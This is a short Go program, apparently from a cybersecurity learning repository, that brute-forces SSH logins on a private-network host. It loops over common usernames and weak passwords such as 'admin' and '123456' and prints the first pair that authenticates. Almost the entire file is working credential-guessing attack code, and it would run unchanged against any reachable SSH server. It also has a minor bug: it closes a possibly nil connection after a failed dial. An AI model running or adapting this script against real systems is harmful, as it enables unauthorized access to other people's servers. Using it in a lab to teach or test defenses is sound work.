package main

import (
	"fmt"
	"net"
	"os"
	"time"

	"github.com/ejuju/cybersec/pkg/netutil"
)

func main() {
	// define target address
	address := &net.TCPAddr{
		IP:   net.IPv4(192, 168, 0, 43), // target IP
		Port: 22,                        // common port for SSH
	}

	// check if TCP connection works (to differentiate SSH dial errors from network errors)
	tcpClient, err := net.DialTCP("tcp", nil, address)
	if err != nil {
		fmt.Printf("unable to connect to remote address:\n%#v\n", address)
	}
	tcpClient.Close()

	// list users and passwords to try
	users := []string{"test", "admin", "user0", "sshadmin"}
	passwords := []string{"pwd", "123456", "password", "admin123"}

	// iterate over all combinations
	for _, user := range users {
		for _, password := range passwords {
			sshconn, err := netutil.NewSSHConnection(netutil.SSHConnectionConfig{
				Address:     address,
				User:        user,
				Password:    password,
				DialTimeout: 100 * time.Millisecond,
			})
			if err != nil {
				continue // invalid credentials
			}
			defer sshconn.Close()

			fmt.Printf("\nFound valid credentials:\nUsername: %v\nPassword: %v\n", user, password)
			os.Exit(0)
		}
	}

	fmt.Printf("could not find valid credentials (with %d combinations with %d users and %d passwords)\n", len(users)*len(passwords), len(users), len(passwords))
	os.Exit(1)
}
